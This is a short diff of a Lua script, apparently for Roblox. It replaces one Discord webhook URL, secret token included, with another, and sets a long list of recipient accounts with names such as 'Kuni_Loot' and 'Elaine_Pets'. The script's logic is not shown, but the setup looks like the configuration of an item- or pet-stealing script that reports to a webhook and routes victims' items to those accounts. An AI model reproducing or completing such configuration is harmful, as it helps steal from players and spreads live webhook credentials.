@@ -1,4 +1,4 @@
-getgenv().Webhook = "https://discord.com/api/webhooks/1406154873090605147/i0Hx4nDhcwYKZuGUdYvI4ac8mBbILkMYlk2XVUt-LOT3UHS_fh9-paMaxccP1hBkgTyD"
+getgenv().Webhook = "https://discord.com/api/webhooks/1406156186335580211/Oz83Tf4KbfR2mMedRBI2srX4uylQ5ILC15CL5_2fDnU07RaLHXXbxGKg6JP_-Y-DrkRf"
 getgenv().Username = "HelloWorld_Z99, Kuni_Loot, Kuni_Loot1, Kuni_Loot02, Kuni_Loot3, Elaine_Pets, Elaine_Pets1, Elaine_Pets2, Elaine_Pets3, Elaine_Pets4, Elaine_Pets5, Elaine_Pets6, Elaine_Pets7, Elaine_Pets8, Elaine_Pets9, Elaine_Pets10, Elaine_Pets11, Elaine_Pets12, Elaine_Pets13, Elaine_Pets14, Elaine_Pets15, Elaine_Pets16, Elaine_Pets17, Elaine_Pets18, Elaine_Pets19, Elaine_Pets20, BEESUYAH"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
@@ -837,5 +837,6 @@ end)
         end
 
     end
+
 
 
